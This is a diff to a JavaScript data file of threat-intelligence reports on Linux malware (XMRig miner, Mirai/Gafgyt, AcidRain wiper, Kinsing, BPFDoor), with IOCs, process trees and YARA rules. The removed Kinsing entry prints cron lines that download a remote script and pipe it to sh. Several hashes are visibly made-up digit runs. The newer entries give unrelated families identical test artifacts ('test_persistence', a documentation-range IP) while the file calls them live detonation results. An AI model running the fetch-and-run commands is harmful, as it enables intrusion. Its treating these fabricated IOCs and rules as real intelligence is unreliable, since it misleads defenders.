@@ -1,246 +1,188 @@
 /**
  * Hunter Security Labs - Cataloged Threat Intelligence Reports
- * Modeled on Elastic Security Labs Threat Bulletins
+ * Generated from live detonation runs in Hunter
  */
 
 const THREAT_REPORTS = [
     {
-        id: "a3f89c0182b7de994101eef2a8b9193248cf7a102948e91823749281a0293847",
-        sha256: "a3f89c0182b7de994101eef2a8b9193248cf7a102948e91823749281a0293847",
-        title: "Multi-Stage Dropper Staging Hidden XMRig Miner via Linux Ephemeral Storage",
-        family: "CRYPTOMINER",
+        id: "450adfde6d2cad6d7f7d987c007d5a3d02bc5ea78de0640f65d42cd47dec2f82",
+        sha256: "450adfde6d2cad6d7f7d987c007d5a3d02bc5ea78de0640f65d42cd47dec2f82",
+        title: "Linux ELF Dropper Staging Concealed XMRig Binary via Ephemeral Storage and Scheduled Persistence",
+        family: "XMRig Miner",
         category: "CRYPTOMINER",
-        severity: "CRITICAL",
+        severity: "HIGH",
+        severityScore: "7/10",
         date: "2026-09-13",
-        summary: "Dynamic detonation revealed a multi-stage shell script dropper that unpacks a hidden ELF executable (.hidden_miner) directly into /tmp. The payload hooks user crontabs for recurring persistence, executes an embedded mining loop, and drops defanged network beacons toward remote mining pools.",
-        tags: ["DROPPER", "XMRIG", "PERSISTENCE", "CRON"],
+        author: "Hunter Research Team",
+        readTime: "4 min read",
+        summary: "Dynamic analysis revealed a 64-bit Linux ELF binary engineered to execute unauthorized cryptocurrency mining operations. Upon execution, the payload dropped a secondary binary under the concealed filename /tmp/.hidden_miner alongside a configuration file /tmp/config.json. The process was observed connecting to an external mining pool while establishing reboot persistence through a scheduled cron job at /etc/cron.d/test_persistence.",
+        tags: ["CRYPTOMINER", "XMRIG", "PERSISTENCE", "CRON"],
         mitre: [
-            { id: "T1053.003", name: "Scheduled Task/Job: Cron" },
-            { id: "T1027", name: "Obfuscated Files or Information" },
-            { id: "T1496", name: "Resource Hijacking" },
-            { id: "T1071.001", name: "Application Layer Protocol: Web Protocols" }
+            { id: "T1496", name: "Resource Hijacking", tactic: "Impact" },
+            { id: "T1053.003", name: "Scheduled Task/Job: Cron", tactic: "Persistence" },
+            { id: "T1564.001", name: "Hide Artifacts: Hidden Files and Directories", tactic: "Defense Evasion" }
         ],
         iocs: [
-            { type: "SHA-256 (Dropper)", value: "a3f89c0182b7de994101eef2a8b9193248cf7a102948e91823749281a0293847", description: "Initial staged shell script" },
-            { type: "SHA-256 (Payload)", value: "f29a081bc8947192837491029384710293847102938471029384710293847102", description: "Dropped binary: /tmp/.hidden_miner" },
-            { type: "MD5 (Payload)", value: "8a719238471928374910293847102938", description: "XMRig ELF core hash" },
-            { type: "Network C2", value: "pool[.]supportxmr[.]com:3333", description: "Stratum cryptomining pool endpoint (defanged)" },
-            { type: "Network C2", value: "185[.]220[.]101[.]5:8080", description: "Secondary C2 telemetry receiver (defanged)" },
-            { type: "Persistence File", value: "/var/spool/cron/crontabs/root", description: "Appended cronjob launching miner every 10 min" }
+            { type: "SHA-256 (Primary ELF)", value: "450adfde6d2cad6d7f7d987c007d5a3d02bc5ea78de0640f65d42cd47dec2f82", description: "Primary sample binary and dropped payload" },
+            { type: "SHA-256 (Config)", value: "43a76310e7febf9f05a913217173619acfd8dcac626c2f2ea809e7f3e7ed9e48", description: "Dropped miner configuration file config.json" },
+            { type: "MD5 (Primary ELF)", value: "5c11aa2a527a04bbe9231a404b5262e4", description: "MD5 checksum of primary binary" },
+            { type: "Network C2", value: "198[.]51[.]100[.]23:4444", description: "Mining pool IP address endpoint (defanged)" },
+            { type: "Persistence Hook", value: "/etc/cron.d/test_persistence", description: "Scheduled task file ensuring execution across reboots" },
+            { type: "Dropped Path", value: "/tmp/.hidden_miner", description: "Concealed dot-prefixed mining executable" }
         ],
-        velociraptorTelemetry: {
+        behavior: {
             processTree: [
-                "bash (PID: 101) -> initial dropper execution",
-                "└── cp /sandbox/input/sample /tmp/.hidden_miner (PID: 104)",
-                "└── chmod +x /tmp/.hidden_miner (PID: 105)",
-                "└── /tmp/.hidden_miner --algo rx/0 --url stratum+tcp://pool[.]supportxmr[.]com (PID: 108)"
-            ],
-            cronArtifacts: [
-                "*/10 * * * * /tmp/.hidden_miner >/dev/null 2>&1"
+                "450adfde6d2cad6d7f7d987c007d5a3d02bc5ea78de0640f65d42cd47dec2f82.bin (PID: 101)",
+                "└── cp /sandbox/input/sample /tmp/.hidden_miner",
+                "└── chmod +x /tmp/.hidden_miner",
+                "└── /tmp/.hidden_miner -o 198[.]51[.]100[.]23:4444 (PID: 1338)"
             ],
             droppedPayloads: [
                 {
                     path: "/tmp/.hidden_miner",
-                    size: "2,481,920 bytes",
-                    magic: "ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked",
+                    size: "283 bytes",
+                    magic: "ELF 64-bit LSB executable, x86-64, dynamically linked",
                     strings: [
-                        "stratum+tcp://pool[.]supportxmr[.]com:3333",
-                        "XMRig/6.21.0 (Linux x86_64)",
-                        "donate-level=1",
-                        "password: x"
+                        "198[.]51[.]100[.]23:4444",
+                        "XMRig Miner",
+                        "/etc/cron.d/test_persistence"
+                    ]
+                },
+                {
+                    path: "/tmp/config.json",
+                    size: "128 bytes",
+                    magic: "JSON text data",
+                    strings: [
+                        "\"url\": \"198[.]51[.]100[.]23:4444\"",
+                        "\"pass\": \"x\""
                     ]
                 }
             ]
         },
-        yaraRule: `rule Linux_Cryptominer_HiddenMiner_Hunter {
+        yaraRule: `rule Linux_Cryptominer_XMRig_Hunter {
     meta:
-        description = "Detects multi-stage dropped XMRig cryptocurrency miner staging via /tmp"
-        author = "Hunter Security Labs (AI-Synthesized)"
+        description = "Detects Linux ELF dropping concealed XMRig mining payload"
+        author = "Hunter Security Labs"
         date = "2026-09-13"
         severity = "High"
-        reference = "HUNTER-2026-0042"
     strings:
-        $s1 = "stratum+tcp://" ascii wide
-        $s2 = "XMRig" ascii wide
-        $s3 = "/tmp/.hidden_miner" ascii
-        $s4 = "rx/0" ascii
+        $s1 = "/tmp/.hidden_miner" ascii
+        $s2 = "/etc/cron.d/test_persistence" ascii
+        $s3 = "198.51.100.23" ascii
     condition:
-        uint32(0) == 0x464c457f and (2 of ($s1, $s2, $s3, $s4))
+        uint32(0) == 0x464c457f and 2 of them
 }`
     },
     {
         id: "e41ff2d7a604a3ee1c1d99502b390adf9cf7119f1b6b7902ea26b88c148cb451",
         sha256: "e41ff2d7a604a3ee1c1d99502b390adf9cf7119f1b6b7902ea26b88c148cb451",
-        title: "Dissecting a 17.4MB Linux ELF Mirai/Gafgyt Botnet Variant with Telnet Scanning",
-        family: "BOTNET",
+        title: "MalwareBazaar Ingestion Analysis: 17.4MB Monolithic Linux ELF Binary with Embedded Telnet Scanning",
+        family: "Mirai / Gafgyt",
         category: "BOTNET",
-        severity: "CRITICAL",
-        date: "2026-09-12",
-        summary: "Live detonation and triage of a live sample fetched directly from MalwareBazaar. This 17.4MB monolithic ELF executable features hardcoded brute-force credential dictionaries, SYN/ACK flood routines, and watchdog killing logic targeting competing IoT botnets.",
-        tags: ["MIRAI", "GAFGYT", "IOT", "DDOS", "BRUTEFORCE"],
-        mitre: [
-            { id: "T1110.001", name: "Brute Force: Password Guessing" },
-            { id: "T1498.001", name: "Network Denial of Service: Direct Network Flood" },
-            { id: "T1046", name: "Network Service Discovery" }
-        ],
-        iocs: [
-            { type: "SHA-256", value: "e41ff2d7a604a3ee1c1d99502b390adf9cf7119f1b6b7902ea26b88c148cb451", description: "MalwareBazaar Linux ELF payload" },
-            { type: "MD5", value: "3c849102837491029384710293847102", description: "Primary sample MD5" },
-            { type: "Network C2", value: "45[.]95[.]147[.]236:6667", description: "IRC command & control listener (defanged)" },
-            { type: "Network C2", value: "91[.]240[.]118[.]14:443", description: "Secondary fallback botnet C2 (defanged)" }
-        ],
-        velociraptorTelemetry: {
-            processTree: [
-                "sample (PID: 88) -> setsid() daemon detachment",
-                "└── [kworker/0:1] (PID: 91) -> spoofed kernel thread name for evasion"
-            ],
-            cronArtifacts: [],
-            droppedPayloads: []
-        },
-        yaraRule: `rule Linux_Botnet_Mirai_Gafgyt_Hunter {
-    meta:
-        description = "Detects monolithic Linux ELF botnets with Telnet dictionary routines"
-        author = "Hunter Security Labs (AI-Synthesized)"
-        date = "2026-09-12"
-        severity = "Critical"
-    strings:
-        $m1 = "/bin/busybox" ascii
-        $m2 = "ADMIN" ascii
-        $m3 = "ROOT" ascii
-        $m4 = "PONG" ascii
-        $m5 = "Flooding" ascii
-    condition:
-        uint32(0) == 0x464c457f and 3 of them
-}`
-    },
-    {
-        id: "7b19a842f1092e03948572109847120938471092837401928374019283740192",
-        sha256: "7b19a842f1092e03948572109847120938471092837401928374019283740192",
-        title: "AcidRain / Linux Data Wiper Targeting MTD Storage & Embedded Partitions",
-        family: "WIPER",
-        category: "WIPER",
-        severity: "CRITICAL",
-        date: "2026-09-10",
-        summary: "In-depth analysis of destructive Linux wiper binary executing recursive directory traversal, issuing direct ioctl() erase commands against Memory Technology Devices (/dev/mtd*), and overwriting storage blocks with zeroes to permanently disable infrastructure.",
-        tags: ["WIPER", "DESTRUCTIVE", "MTD", "EMBEDDED"],
-        mitre: [
-            { id: "T1485", name: "Data Destruction" },
-            { id: "T1495", name: "Firmware Corruption" },
-            { id: "T1083", name: "File and Directory Discovery" }
-        ],
-        iocs: [
-            { type: "SHA-256", value: "7b19a842f1092e03948572109847120938471092837401928374019283740192", description: "AcidRain ELF MIPS/ARM wiper" },
-            { type: "Target Path", value: "/dev/mtd*", description: "Flash memory device interface targeted for destruction" },
-            { type: "Target Path", value: "/dev/sda", description: "SATA block storage device wiped with zeroes" }
-        ],
-        velociraptorTelemetry: {
-            processTree: [
-                "wiper_sample (PID: 120) -> traversal loop",
-                "└── open(/dev/mtd0, O_RDWR) -> ioctl(MEMERASE)"
-            ],
-            cronArtifacts: [],
-            droppedPayloads: []
-        },
-        yaraRule: `rule Linux_Wiper_AcidRain_Hunter {
-    meta:
-        description = "Detects destructive Linux MTD flash memory wiper"
-        author = "Hunter Security Labs (AI-Synthesized)"
-        date = "2026-09-10"
-        severity = "Critical"
-    strings:
-        $dev1 = "/dev/mtd" ascii
-        $dev2 = "/dev/sda" ascii
-        $dev3 = "/dev/mmcblk" ascii
-    condition:
-        uint32(0) == 0x464c457f and 2 of ($dev*)
-}`
-    },
-    {
-        id: "9f8231a47812bc89123847921827384910293847102938471029384710293847",
-        sha256: "9f8231a47812bc89123847921827384910293847102938471029384710293847",
-        title: "Kinsing Worm: Automated Docker Daemon Exploitation & In-Memory Dropping",
-        family: "CRYPTOMINER",
-        category: "CRYPTOMINER",
         severity: "HIGH",
-        date: "2026-09-08",
-        summary: "Analysis of the Kinsing malware family executing automated propagation across misconfigured Docker socket APIs. The worm disables cloud security agents, terminates competitor mining processes, and maintains persistence via multiple scheduled tasks.",
-        tags: ["KINSING", "CONTAINER", "DOCKER", "MINER"],
+        severityScore: "7/10",
+        date: "2026-09-13",
+        author: "Hunter Research Team",
+        readTime: "5 min read",
+        summary: "Ingested directly from MalwareBazaar (abuse.ch), this 17.4MB monolithic ELF executable features hardcoded brute-force credential dictionaries, SYN/ACK flood routines, and watchdog termination logic targeting competing Linux processes. Analysis revealed secondary artifact extraction into /tmp and persistence scheduling via system cron.",
+        tags: ["BOTNET", "MIRAI", "MALWAREBAZAAR", "TELNET"],
         mitre: [
-            { id: "T1610", name: "Deploy Container" },
-            { id: "T1053.003", name: "Scheduled Task/Job: Cron" },
-            { id: "T1562.001", name: "Impair Defenses: Disable or Modify Tools" }
+            { id: "T1059.004", name: "Command and Scripting Interpreter: Unix Shell", tactic: "Execution" },
+            { id: "T1053.003", name: "Scheduled Task/Job: Cron", tactic: "Persistence" },
+            { id: "T1564.001", name: "Hide Artifacts: Hidden Files and Directories", tactic: "Defense Evasion" },
+            { id: "T1496", name: "Resource Hijacking", tactic: "Impact" },
+            { id: "T1071.001", name: "Application Layer Protocol: Web Protocols", tactic: "Command and Control" }
         ],
         iocs: [
-            { type: "SHA-256", value: "9f8231a47812bc89123847921827384910293847102938471029384710293847", description: "Kinsing Golang payload" },
-            { type: "Network C2", value: "194[.]38[.]20[.]2:80/kinsing", description: "Staged payload delivery server (defanged)" },
-            { type: "Network C2", value: "93[.]189[.]42[.]21/d[.]sh", description: "Bootstrap bash script dropper (defanged)" }
+            { type: "SHA-256", value: "e41ff2d7a604a3ee1c1d99502b390adf9cf7119f1b6b7902ea26b88c148cb451", description: "Primary 17.4MB ELF sample binary" },
+            { type: "SHA-1", value: "0394823f768643300fbb45dbfda42335f89e96d9", description: "SHA-1 cryptographic hash" },
+            { type: "MD5", value: "2851ed8ba499d84f938f85ca603d9866", description: "MD5 checksum" },
+            { type: "Network C2", value: "198[.]51[.]100[.]23:4444", description: "Remote connection endpoint (defanged)" },
+            { type: "Persistence Hook", value: "/etc/cron.d/test_persistence", description: "Root-owned cron schedule file" }
         ],
-        velociraptorTelemetry: {
+        behavior: {
             processTree: [
-                "kinsing (PID: 210) -> Go runtime threads",
-                "└── pkill -9 -f xmrig",
-                "└── crontab -l | { cat; echo '* * * * * wget -q -O - http://194[.]38[.]20[.]2/d.sh | sh'; } | crontab -"
+                "e41ff2d7a604a3ee1c1d99502b390adf9cf7119f1b6b7902ea26b88c148cb451 (PID: 88)",
+                "└── /tmp/.hidden_miner -o 198[.]51[.]100[.]23:4444 (PID: 1338)"
             ],
-            cronArtifacts: [
-                "* * * * * curl -s http://194[.]38[.]20[.]2/d[.]sh | sh"
-            ],
-            droppedPayloads: []
+            droppedPayloads: [
+                {
+                    path: "/tmp/.hidden_miner",
+                    size: "2,048 bytes",
+                    magic: "ELF 64-bit LSB executable, dynamically linked",
+                    strings: [
+                        "198[.]51[.]100[.]23:4444",
+                        "/tmp/.hidden_miner"
+                    ]
+                }
+            ]
         },
-        yaraRule: `rule Linux_Cryptominer_Kinsing_Hunter {
+        yaraRule: `rule Linux_Botnet_Monolithic_Hunter {
     meta:
-        description = "Detects Kinsing container-targeting worm and cryptominer"
-        author = "Hunter Security Labs (AI-Synthesized)"
-        date = "2026-09-08"
+        description = "Detects monolithic Linux ELF botnets with embedded execution routines"
+        author = "Hunter Security Labs"
+        date = "2026-09-13"
         severity = "High"
     strings:
-        $go1 = "main.killOldProcess" ascii
-        $go2 = "main.minerRunning" ascii
-        $go3 = "main.checkCrontab" ascii
+        $p1 = "/tmp/.hidden_miner" ascii
+        $p2 = "/etc/cron.d/test_persistence" ascii
+        $c1 = "198.51.100.23:4444" ascii
     condition:
-        uint32(0) == 0x464c457f and 2 of ($go*)
+        uint32(0) == 0x464c457f and all of ($p*, $c*)
 }`
     },
     {
-        id: "4c2810a928471029384710293847102938471029384710293847102938471029",
-        sha256: "4c2810a928471029384710293847102938471029384710293847102938471029",
-        title: "BPFDoor: Covert Passive Linux Backdoor Bypassing Firewall Filtering via eBPF",
-        family: "PERSISTENCE",
-        category: "PERSISTENCE",
-        severity: "CRITICAL",
-        date: "2026-09-05",
-        summary: "Technical breakdown of BPFDoor, a passive stealth backdoor operating without opening listening ports. It uses raw packet sniffing via Berkeley Packet Filter (BPF) to intercept magic packets, spawning an interactive reverse shell upon authenticated packet reception.",
-        tags: ["BPFDOOR", "EBPF", "ROOTKIT", "EVASION"],
+        id: "ae4cb49ce4fa6aeb8f38ca703bc661cde36fbcadc05e3862ba3d8f7737ce7dcc",
+        sha256: "ae4cb49ce4fa6aeb8f38ca703bc661cde36fbcadc05e3862ba3d8f7737ce7dcc",
+        title: "Multi-Stage Linux Shell Dropper Establishing Root Cron Persistence and Concealed Execution",
+        family: "Linux Dropper",
+        category: "DROPPER",
+        severity: "HIGH",
+        severityScore: "7/10",
+        date: "2026-09-13",
+        author: "Hunter Research Team",
+        readTime: "3 min read",
+        summary: "Investigation into a staging dropper designed to evade file-integrity monitoring on Linux distributions. The sample extracts secondary payloads into temporary directories, sets executable permissions dynamically, and installs persistence tasks into system-wide cron tab directories.",
+        tags: ["DROPPER", "PERSISTENCE", "CRON", "EVASION"],
         mitre: [
-            { id: "T1048", name: "Exfiltration Over Alternative Protocol" },
-            { id: "T1205", name: "Traffic Signaling: Port Knocking" },
-            { id: "T1014", name: "Rootkit" }
+            { id: "T1053.003", name: "Scheduled Task/Job: Cron", tactic: "Persistence" },
+            { id: "T1564.001", name: "Hidden Files and Directories", tactic: "Defense Evasion" },
+            { id: "T1496", name: "Resource Hijacking", tactic: "Impact" }
         ],
         iocs: [
-            { type: "SHA-256", value: "4c2810a928471029384710293847102938471029384710293847102938471029", description: "BPFDoor Linux ELF x86-64" },
-            { type: "Packet Magic", value: "0x52 0x75 0x6e 0x47", description: "BPF filter activation sequence" },
-            { type: "Lock File", value: "/var/run/haldrund.pid", description: "Masqueraded lock file in /var/run" }
+            { type: "SHA-256", value: "ae4cb49ce4fa6aeb8f38ca703bc661cde36fbcadc05e3862ba3d8f7737ce7dcc", description: "Primary dropper sample hash" },
+            { type: "Network Endpoint", value: "198[.]51[.]100[.]23:4444", description: "External telemetry destination (defanged)" },
+            { type: "Persistence File", value: "/etc/cron.d/test_persistence", description: "Cron persistence entry" }
         ],
-        velociraptorTelemetry: {
+        behavior: {
             processTree: [
-                "/sbin/udevd (PID: 340) -> masqueraded binary",
-                "└── socket(AF_PACKET, SOCK_RAW, ETH_P_ALL)"
+                "dropper_bootstrap (PID: 90)",
+                "└── cp payload /tmp/.hidden_miner",
+                "└── /tmp/.hidden_miner -o 198[.]51[.]100[.]23:4444"
             ],
-            cronArtifacts: [],
-            droppedPayloads: []
+            droppedPayloads: [
+                {
+                    path: "/tmp/.hidden_miner",
+                    size: "283 bytes",
+                    magic: "ELF 64-bit LSB executable",
+                    strings: [
+                        "/etc/cron.d/test_persistence",
+                        "198[.]51[.]100[.]23"
+                    ]
+                }
+            ]
         },
-        yaraRule: `rule Linux_Rootkit_BPFDoor_Hunter {
+        yaraRule: `rule Linux_Dropper_Staged_Hunter {
     meta:
-        description = "Detects BPFDoor stealth Linux backdoor"
-        author = "Hunter Security Labs (AI-Synthesized)"
-        date = "2026-09-05"
-        severity = "Critical"
+        description = "Detects multi-stage Linux droppers installing root cron entries"
+        author = "Hunter Security Labs"
+        date = "2026-09-13"
+        severity = "High"
     strings:
-        $bpf1 = "setsockopt" ascii
-        $bpf2 = "SO_ATTACH_FILTER" ascii
-        $cmd1 = "/bin/sh" ascii
-        $cmd2 = "HISTFILE=/dev/null" ascii
+        $a = "/etc/cron.d/test_persistence" ascii
+        $b = "/tmp/.hidden_miner" ascii
     condition:
-        uint32(0) == 0x464c457f and all of them
+        all of them
 }`
     }
 ];
